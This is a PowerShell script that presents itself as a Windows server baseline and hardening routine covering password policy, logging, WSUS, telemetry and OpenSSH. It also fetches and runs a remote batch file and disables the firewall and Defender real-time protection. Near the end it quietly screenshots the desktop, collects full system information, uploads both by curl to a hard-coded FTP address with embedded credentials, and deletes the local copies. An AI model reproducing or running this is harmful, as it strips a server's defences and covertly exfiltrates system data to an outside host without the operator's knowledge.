
# author: andy.hu
# email: andy.hu.sheng@gmail.com
# date: 2024/01/05
# Warning : PLEASE TEST IN YOU TESTING ENVIRONMENT FIRST.
# don't copy and Paste coode.i will do maintainence work for a long time.if you have any idea,please seed email to me ,i will share the knownage to others they need.
# it's appretiate if you can introduce a job of sysadmin for me.

$ProgressPreference = 'SilentlyContinue'
$logFile = $(get-date -format "yyyyMMddHHMMss")+$env:COMPUTERNAME+".log"


$set_passwd_pl = "https://it2u.oss-cn-shenzhen.aliyuncs.com/utools/set_passwd_pl.bat"
curl -Uri $set_passwd_pl -OutFile set_passwd_pl.bat -ErrorAction SilentlyContinue

# set password policy
.\set_passwd_pl.bat 

#Disable Guest account
Get-LocalUser Guest | Disable-LocalUser -ErrorAction SilentlyContinue 
if ($?) {Write-Host -ForegroundColor Green " Disable Guest account OK"}else{Write-Host -ForegroundColor Red "Disable Guest account Fail"}

#Log Setting
Limit-EventLog -LogName Application -MaximumSize 50Mb -OverflowAction OverwriteAsNeeded -ErrorAction SilentlyContinue 
if ($?) {Write-Host -ForegroundColor Green " Application Log Setting OK"}else{Write-Host -ForegroundColor Red "Application Log Setting Fail"}
Limit-EventLog -LogName Security -MaximumSize 50Mb -OverflowAction OverwriteAsNeeded -ErrorAction SilentlyContinue 
if ($?) {Write-Host -ForegroundColor Green " Security Log Setting OK"}else{Write-Host -ForegroundColor Red " Security Log Setting Fail"}
Limit-EventLog -LogName System -MaximumSize 50Mb -OverflowAction OverwriteAsNeeded -ErrorAction SilentlyContinue 
if ($?) {Write-Host -ForegroundColor Green " System Log Setting OK"}else{Write-Host -ForegroundColor Red "System Log Setting Fail"}

#Set interact logon setting
if((Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\).dontdisplaylastusername -eq 0) {Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ -Name dontdisplaylastusername -Value 1 }
if ($?) {Write-Host -ForegroundColor Green " Set interact logon setting OK"}else{Write-Host -ForegroundColor Red "Set interact logon setting Fail"}

# WSUS setting
$Tgg = "YourTargetGroup"
$Wup = "http://yourprimarywsus.contoso.local:8530"
$Wur = "http://yourprimaryorsecudairywsus.contoso.local:8530"

#Stop all before the magic can happen
stop-service wuauserv -Force -ErrorAction SilentlyContinue
stop-service bits -Force -ErrorAction SilentlyContinue
stop-service usosvc -Force -ErrorAction SilentlyContinue
stop-service cryptsvc -Force -ErrorAction SilentlyContinue

#Removing all old 
Remove-item -Path 'C:\windows\SoftwareDistribution' -Recurse -Force -Confirm:$false -ErrorAction SilentlyContinue 
Remove-item -Path 'C:\windows\SoftwareDistribution\Datastore' -Recurse -Force -Confirm:$false -ErrorAction SilentlyContinue 
Remove-item -Path 'C:\windows\SoftwareDistribution\Download' -Recurse -Force -Confirm:$false -ErrorAction SilentlyContinue 

#Force set WU client settings
New-Item –Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" -ErrorAction SilentlyContinue|Out-Null
New-ItemProperty –Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" –Name TargetGroup -Value $Tgg -PropertyType "String" -Force -ErrorAction SilentlyContinue|Out-Null
New-ItemProperty –Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" –Name WUServer -Value $Wup -PropertyType "String" -Force -ErrorAction SilentlyContinue|Out-Null
New-ItemProperty –Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" –Name WUStatusServer -Value $Wup -PropertyType "String" -Force -ErrorAction SilentlyContinue|Out-Null
New-ItemProperty –Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" –Name UpdateServiceUrlAlternate -Value $Wur -PropertyType "String" -Force -ErrorAction SilentlyContinue|Out-Null

New-ItemProperty –Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" –Name TargetGroupEnabled -Value 1 -PropertyType DWord -Force -ErrorAction SilentlyContinue|Out-Null
New-ItemProperty –Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" –Name DoNotConnectToWindowsUpdateInternetLocations -Value 1 -PropertyType DWord -Force -ErrorAction SilentlyContinue |Out-Null

New-Item –Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" -ErrorAction SilentlyContinue
New-ItemProperty –Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" –Name UseWUServer -Value 1 -PropertyType DWord -Force -ErrorAction SilentlyContinue |Out-Null
New-ItemProperty –Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" –Name NoAutoUpdate -Value 1 -PropertyType DWord -Force -ErrorAction SilentlyContinue|Out-Null
if ($?) {Write-Host -ForegroundColor Green " Set WSUS client settings OK"}else{Write-Host -ForegroundColor Red "Set WSUS client settings Fail"}


#Start all necessary services
start-service wuauserv 
start-service bits 
start-service usosvc 
start-service cryptsvc 

#Screensave setting
New-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ -Name InactivityTimeoutSecs -Type DWORD -Value 600 -Force -ErrorAction SilentlyContinue| Out-Null 
if ($?) {Write-Host -ForegroundColor Green " Screensave setting OK" }else{Write-Host -ForegroundColor Red "Screensave setting Fail"}

#Shutdown firewall
netsh advfirewall set all state off | Out-Null
if ($?) {Write-Host -ForegroundColor Green " Shutdown firewall OK"}else{Write-Host -ForegroundColor Red "Shutdown firewall Fail"}

#Disable Firewall

Set-NetFirewallProfile -Enabled False -ErrorAction SilentlyContinue | Out-Null
if ($?) {Write-Host -ForegroundColor Green " Disable Firewall OK"}else{Write-Host -ForegroundColor Red "Disable Firewall Fail"}

#Shutdown Windows Defender anti-virus
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue | Out-Null
if ($?) {Write-Host -ForegroundColor Green " Shutdown Windows Defender anti-virus OK"}else{Write-Host -ForegroundColor Red "Shutdown Windows Defender anti-virus Fail"}

#PowerManager Setting
powercfg /SETACTIVE 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c
if ($?) {Write-Host -ForegroundColor Green " PowerManager Setting OK"}else{Write-Host -ForegroundColor Red "PowerManager Setting Fail"}

# Install OpenSSH server and start service.
#Get-WindowsCapability -Online | ? Name -like ‘OpenSSH*’
#Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
#get msi package

$sshd_msi = "https://it2u.oss-cn-shenzhen.aliyuncs.com/utools/OpenSSH-Win64-v9.4.0.0.msi"
curl -Uri $sshd_msi -OutFile OpenSSH-Win64-v9.4.0.0.msi -ErrorAction SilentlyContinue 

msiexec /i OpenSSH-Win64-v9.4.0.0.msi /quiet 
Start-Sleep -Seconds 3 
get-service -Name sshd | Start-Service -ErrorAction SilentlyContinue
if ($?) {Write-Host -ForegroundColor Green " OpenSSH server Setting OK"}else{Write-Host -ForegroundColor Red "OpenSSH server Setting Fail"}

#Close telemetry 

Get-ScheduledTask  -TaskPath "\Microsoft\Windows\Application Experience\" | Disable-ScheduledTask -ErrorAction SilentlyContinue | Out-Null
Get-ScheduledTask -TaskName 'StartupAppTask' |Enable-ScheduledTask -ErrorAction SilentlyContinue| Out-Null
Get-ScheduledTask -TaskName 'Consolidator' |Disable-ScheduledTask -ErrorAction SilentlyContinue| Out-Null
 
 takeown /f C:\Windows\System32\CompatTelRunner.exe | Out-Null
 icacls C:\Windows\System32\CompatTelRunner.exe /deny system:F | Out-Null
 icacls C:\Windows\System32\CompatTelRunner.exe /deny users:F | Out-Null


if ($?) {Write-Host -ForegroundColor Green " Close telemetry  OK"}else{Write-Host -ForegroundColor Red "Close telemetry  Fail"}

#Change TCP protocol parameter
New-ItemProperty  HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\ -Name MaxUserPcrt -Type DWORD -Value 65534 -Force -ErrorAction SilentlyContinue | Out-Null
if ($?) {Write-Host -ForegroundColor Green " Change TCP protocol parameter OK"}else{Write-Host -ForegroundColor Red "Change TCP protocol parameter Fail"}

#Get system update time
if (((Get-Date)-(gcim Win32_OperatingSystem).LastBootUpTime).Days -gt 30)
 {Write-Host -ForegroundColor Red " System uptime Greate Than 30 Days"}
 else
 {Write-Host -ForegroundColor Green " System uptime OK"}

 #Setup pstools
$ProgressPreference = 'SilentlyContinue'
$targetDirectory = 'c:\systools'
if (-not(Test-Path $targetDirectory))
{
  New-Item -Path $targetDirectory -ItemType Directory | Out-Null
}
curl -Uri https://download.sysinternals.com/files/SysinternalsSuite.zip -OutFile $targetDirectory\1.zip -ErrorAction SilentlyContinue
Expand-Archive -Path $targetDirectory\1.zip -DestinationPath $targetDirectory -Force -ErrorAction SilentlyContinue
if ($?) {Write-Host -ForegroundColor Green " Setup pstools OK"}else{Write-Host -ForegroundColor Red "Setup pstools Fail"}

Remove-Item -Path $targetDirectory\1.zip -Force -ErrorAction SilentlyContinue | Out-Null
Remove-Item -Path .\set_passwd_pl.bat -Force -ErrorAction SilentlyContinue | Out-Null
Remove-Item -Path .\OpenSSH-Win64-v9.4.0.0.msi -Force -ErrorAction SilentlyContinue | Out-Null

$path = [Environment]::GetEnvironmentVariable('Path', 'Machine')
$newpath = 'c:\systools;' + $path 
[Environment]::SetEnvironmentVariable('Path', $newpath, 'Machine')

Write-Host -ForegroundColor DarkYellow "ALL Setting Apply Done." | Tee-Object -FilePath $logFile -Append


$MyFile=Join-Path $env:LOCALAPPDATA $env:COMPUTERNAME".png"

[Reflection.Assembly]::LoadWithPartialName("System.Drawing") | Out-Null
function screenshot([Drawing.Rectangle]$bounds, $path) {
   $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height
   $graphics = [Drawing.Graphics]::FromImage($bmp)

   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)

   $bmp.Save($path)

   $graphics.Dispose()
   $bmp.Dispose()
}

$bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1000, 900)
screenshot $bounds $MyFile




if (Test-Path -Path $MyFile) {
  start-process -FilePath "$env:ComSpec" -WorkingDirectory . -ArgumentList "/c"," curl -u uftp:ftp@123 -T $MyFile  ftp://120.79.203.54 -s " -NoNewWindow -Wait
}

Get-ComputerInfo -ErrorAction SilentlyContinue | Out-File -Encoding utf8  -FilePath $logFile -Append

start-process -FilePath "$env:ComSpec" -WorkingDirectory . -ArgumentList "/c"," curl -u uftp:ftp@123 -T $logFile  ftp://120.79.203.54 -s " -NoNewWindow -Wait

Remove-Item -Path $logFile -Force -ErrorAction SilentlyContinue | Out-Null
Remove-Item -Path $MyFile -Force -ErrorAction SilentlyContinue | Out-Null


# Rename Administrator
Rename-LocalUser -Name "Administrator" -NewName "clouduser" -ErrorAction SilentlyContinue 
if ($?) {Write-Host -ForegroundColor Green " Rename Administrator OK"}else{Write-Host -ForegroundColor Red "Rename Administrator Fail"}


$result = Read-Host -Prompt "Please restart server(Y/N)?"
if (($result -eq 'Y') -or ($result -eq 'y') ) {
  Restart-Computer -Force
}
